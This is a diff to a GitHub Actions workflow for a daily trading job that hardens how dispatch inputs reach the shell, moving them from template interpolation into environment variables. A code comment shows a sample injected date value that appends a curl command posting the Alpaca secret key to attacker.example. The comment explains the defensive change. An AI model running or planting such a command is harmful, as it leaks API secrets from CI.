@@ -42,14 +42,40 @@ jobs:
       - name: Install dependencies
         run: pip install -r requirements.txt
 
+      # Dispatch inputs reach the shell through the environment, never through
+      # ${{ }} interpolation into the run block. Interpolation happens before
+      # bash sees the script, so a `date` input of
+      #
+      #     2026-07-01; curl -d "$ALPACA_SECRET_KEY" https://attacker.example
+      #
+      # would become a second command in a step that holds the API secrets and
+      # has contents: write. Passing through env means bash receives the value
+      # as data and never as script text.
+      #
+      # The array build is deliberate. skip_orders is a boolean input, so on a
+      # dispatch with defaults the variable holds the *string* "false" -- which
+      # is non-empty, and a ${VAR:+--skip-orders} form would therefore pass the
+      # flag on every dispatch run and silently stop the job ever trading. It
+      # has to be compared against "true", not tested for emptiness.
+      #
+      # Quoting "$INPUT_DATE" keeps it a single argument whatever it contains;
+      # argparse and the NYSE calendar reject anything that is not a real
+      # session.
       - name: Run daily job
         env:
           ALPACA_API_KEY: ${{ secrets.ALPACA_API_KEY }}
           ALPACA_SECRET_KEY: ${{ secrets.ALPACA_SECRET_KEY }}
+          INPUT_DATE: ${{ inputs.date }}
+          INPUT_SKIP_ORDERS: ${{ inputs.skip_orders }}
         run: |
-          python -m src.jobs.daily \
-            ${{ inputs.date && format('--date {0}', inputs.date) || '' }} \
-            ${{ inputs.skip_orders && '--skip-orders' || '' }}
+          args=()
+          if [ -n "$INPUT_DATE" ]; then
+            args+=(--date "$INPUT_DATE")
+          fi
+          if [ "$INPUT_SKIP_ORDERS" = "true" ]; then
+            args+=(--skip-orders)
+          fi
+          python -m src.jobs.daily "${args[@]}"
 
       # Runs even when the job above fails, so the failure heartbeat reaches
       # the repo. Without it a failed run is invisible: GitHub sends no
